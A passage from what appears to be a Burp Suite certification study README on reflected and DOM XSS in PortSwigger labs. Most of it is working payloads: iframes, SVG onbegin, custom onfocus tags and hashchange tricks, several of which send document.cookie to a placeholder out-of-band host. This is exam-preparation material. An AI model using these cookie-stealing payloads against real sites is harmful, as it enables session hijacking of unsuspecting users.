rel=\"nofollow\"\u003ePortSwigger Academy Methodology\u003c/a\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eURL and Base64 online encoders and decoders\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cul dir=\"auto\"\u003e\n\u003cli\u003e\u003ca href=\"https://www.urldecoder.org/\" rel=\"nofollow\"\u003eURL Decode and Encode\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://www.base64encode.org/\" rel=\"nofollow\"\u003eBASE64 Decode and Encode\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis lab gives great \u003cstrong\u003eMethodology\u003c/strong\u003e to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e allowed HTML tags and events for crafting POC XSS.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eHost \u003cstrong\u003eiframe\u003c/strong\u003e code on exploit server and deliver exploit link to victim.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe src=\u0026quot;https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E\u0026quot;\u0026gt;  \"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e  \u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked\" rel=\"nofollow\"\u003ePortSwigger Lab: Reflected XSS into HTML context with most tags and attributes blocked\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn below sample the tag \u003cstrong\u003eBody\u003c/strong\u003e and event \u003cstrong\u003eonresize\u003c/strong\u003e is the only allowed, providing an injection to perform XSS.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"?search=%22%3E%3Cbody%20onresize=print()%3E\u0026quot; onload=this.style.width='100px'\u0026gt;\"\u003e\u003cpre\u003e?\u003cspan class=\"pl-s1\"\u003esearch\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e22\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e3\u003c/span\u003e\u003cspan class=\"pl-v\"\u003eE\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e3\u003c/span\u003e\u003cspan class=\"pl-v\"\u003eCbody\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e20\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eonresize\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e3\u003c/span\u003e\u003cspan class=\"pl-v\"\u003eE\u003c/span\u003e\" onload=this.style.width='100px'\u0026gt;\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThis example show the \u003cstrong\u003eBody\u003c/strong\u003e and event \u003cstrong\u003eonpopstate\u003c/strong\u003e is not blocked.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"?search=%22%3E%3Cbody%20onpopstate=print()\u0026gt;\"\u003e\u003cpre\u003e?\u003cspan class=\"pl-s1\"\u003esearch\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e22\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e3\u003c/span\u003e\u003cspan class=\"pl-v\"\u003eE\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e3\u003c/span\u003e\u003cspan class=\"pl-v\"\u003eCbody\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e%\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e20\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eonpopstate\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-en\"\u003eprint\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e(\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e)\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onpopstate\" rel=\"nofollow\"\u003ePortSwigger Cheat-sheet XSS Example: onpopstate event\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow JavaScript is hosted on exploit server and then deliver to victim.\u003cbr\u003e\nThe \u003ccode\u003ecode\u003c/code\u003e is an iframe doing \u003cstrong\u003eonload\u003c/strong\u003e and the search parameter is vulnerable to \u003cstrong\u003eonpopstate\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe onload=\u0026quot;if(!window.flag){this.contentWindow.location='https://TARGET.net?search=\u0026lt;body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie\u0026gt;#';flag=1}\u0026quot; src=\u0026quot;https://TARGET.net?search=\u0026lt;body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie\u0026gt;\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eonload\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"if(!window.flag){this.contentWindow.location='https://TARGET.net?search=\u0026lt;body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie\u0026gt;#';flag=1}\"\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"https://TARGET.net?search=\u0026lt;body onpopstate=document.location=`http://OASTIFY.COM/?`+document.cookie\u0026gt;\"\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eiframe\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eBypass Blocked Tags\u003c/h3\u003e\u003ca id=\"user-content-bypass-blocked-tags\" class=\"anchor\" aria-label=\"Permalink: Bypass Blocked Tags\" href=\"#bypass-blocked-tags\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eApplication controls give message, \u003cem\u003e\u003cstrong\u003e\"Tag is not allowed\"\u003c/strong\u003e\u003c/em\u003e when inserting basic XSS payloads, but discover SVG mark-up allowed using above \u003ca href=\"#identify-allowed-tags\"\u003emethodology\u003c/a\u003e. This payload steal my own session cookie as POC.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E\"\u003e\u003cpre\u003ehttps://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePlace the above payload on exploit server and insert URL with search value into an \u003ccode\u003eiframe\u003c/code\u003e before delivering to victim in below code block.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe src=\u0026quot;https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E\u0026quot;\u0026gt;\n\u0026lt;/iframe\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e=\"\u003cspan class=\"pl-s\"\u003ehttps://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E\u003c/span\u003e\"\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003eiframe\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/svg-animatetransform-xss.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/svg-animatetransform-xss.png\" alt=\"svg animatetransform XSS\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed\" rel=\"nofollow\"\u003ePortSwigger Lab: Reflected XSS with some SVG markup allowed\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eXSS Assign protocol\u003c/h3\u003e\u003ca id=\"user-content-xss-assign-protocol\" class=\"anchor\" aria-label=\"Permalink: XSS Assign protocol\" href=\"#xss-assign-protocol\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eLab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the \u003cstrong\u003eAssignable protocol with location\u003c/strong\u003e \u003ccode\u003ejavascript\u003c/code\u003e exploit \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e by \u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location\" rel=\"nofollow\"\u003ePortSwigger XSS research\u003c/a\u003e. In the payload is the \u003ccode\u003e%0a\u003c/code\u003e representing the ASCII newline character.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;location.protocol='javascript';\u0026lt;/script\u0026gt;#%0adocument.location='http://OASTIFY.COM/?p='+document.cookie//\u0026amp;context=html\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003elocation\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e.\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003eprotocol\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e'javascript'\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003escript\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e#%0adocument.location='http://OASTIFY.COM/?p='+document.cookie//\u0026amp;context=html\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/xss-protocol-location.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/xss-protocol-location.png\" alt=\"XSS protocol location\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded\" rel=\"nofollow\"\u003ePortSwigger Lab: Reflected XSS into HTML context with nothing encoded\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eCustom Tags not Blocked\u003c/h3\u003e\u003ca id=\"user-content-custom-tags-not-blocked\" class=\"anchor\" aria-label=\"Permalink: Custom Tags not Blocked\" href=\"#custom-tags-not-blocked\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eApplication respond with message \u003cem\u003e\u003cstrong\u003e\"Tag is not allowed\"\u003c/strong\u003e\u003c/em\u003e when attempting to insert XSS payloads, but if we create a custom tag it is bypassed.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-basic notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;xss+id=x\u0026gt;#x';\"\u003e\u003cpre\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-ent\"\u003exss\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e+id\u003c/span\u003e=\u003cspan class=\"pl-s\"\u003ex\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026gt;\u003c/span\u003e#x';\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e if above custom tag is not block in search function, by observing the response. Create below payload to steal session cookie out-of-band.\u003c/p\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\nlocation = 'https://TARGET.net/?search=\u0026lt;xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1\u0026gt;#x';\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\nlocation = 'https://TARGET.net/?search=\u0026lt;xss+id=x+onfocus=document.location='https://OASTIFY.COM/?c='+document.cookie tabindex=1\u0026gt;#x';\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cstrong\u003eNote:\u003c/strong\u003e The custom tag with the ID \u003ccode\u003ex\u003c/code\u003e, which contains an \u003cstrong\u003eonfocus\u003c/strong\u003e event handler that triggers the \u003ccode\u003edocument.location\u003c/code\u003e function. The \u003cstrong\u003eHASH\u003c/strong\u003e \u003ccode\u003e#\u003c/code\u003e character at the end of the URL focuses on this element as soon as the page is loaded, causing the payload to be called. Host the payload script on the exploit server in \u003ccode\u003escript\u003c/code\u003e tags, and send to victim. Below is the same payload but \u003cstrong\u003eURL-encoded\u003c/strong\u003e format.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"\u0026lt;script\u0026gt;\nlocation = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';\n\u0026lt;/script\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e\u0026lt;script\u0026gt;\nlocation = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';\n\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/custom-xss-tag.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/custom-xss-tag.png\" alt=\"Custom XSS tag\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked\" rel=\"nofollow\"\u003ePortSwigger Lab: Reflected XSS into HTML context with all tags blocked except custom ones\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://youtu.be/sjs6RS7lURk\" rel=\"nofollow\"\u003ez3nsh3ll - explaining custom tags for XSS attacks\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eOnHashChange\u003c/h3\u003e\u003ca id=\"user-content-onhashchange\" class=\"anchor\" aria-label=\"Permalink: OnHashChange\" href=\"#onhashchange\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eBelow iframe uses \u003cstrong\u003eHASH\u003c/strong\u003e \u003ccode\u003e#\u003c/code\u003e character at end of the URL to trigger the \u003cstrong\u003eOnHashChange\u003c/strong\u003e XSS cookie stealer.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe src=\u0026quot;https://TARGET.net/#\u0026quot; onload=\u0026quot;document.location='http://OASTIFY.COM/?cookies='+document.cookie\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"https://TARGET.net/#\"\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eonload\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"document.location='http://OASTIFY.COM/?cookies='+document.cookie\"\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eiframe\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNote if the cookie is secure with \u003cstrong\u003eHttpOnly\u003c/strong\u003e flag set enabled, the cookie cannot be stolen using XSS.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePortSwigger Lab payload perform print.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-js notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;iframe src=\u0026quot;https://TARGET.net/#\u0026quot; onload=\u0026quot;this.src+='\u0026lt;img src=x onerror=print()\u0026gt;'\u0026quot;\u0026gt;\u0026lt;/iframe\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-c1\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eiframe\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003esrc\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"https://TARGET.net/#\"\u003c/span\u003e \u003cspan class=\"pl-c1\"\u003eonload\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e=\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\"this.src+='\u0026lt;img src=x onerror=print()\u0026gt;'\"\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"pl-s1\"\u003eiframe\u003c/span\u003e\u003cspan class=\"pl-c1\"\u003e\u0026gt;\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eNote: \u003cem\u003e\u003cstrong\u003eIdentify\u003c/strong\u003e\u003c/em\u003e the vulnerable jquery 1.8.2 version included in the \u003ccode\u003esource code\u003c/code\u003e with the CSS selector action a the \u003cstrong\u003ehashchange\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/hashchange.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/hashchange.png\" alt=\"Hashchange\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event\" rel=\"nofollow\"\u003ePortSwigger Lab: DOM XSS in jQuery selector sink using a hashchange event\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md\"\u003eCrypto-Cat: DOM XSS in jQuery selector sink using a hashchange event\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eReflected String XSS\u003c/h3\u003e\u003ca id=\"user-content-reflected-string-xss\" class=\"anchor\" aria-label=\"Permalink: Reflected String XSS\" href=\"#reflected-string-xss\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 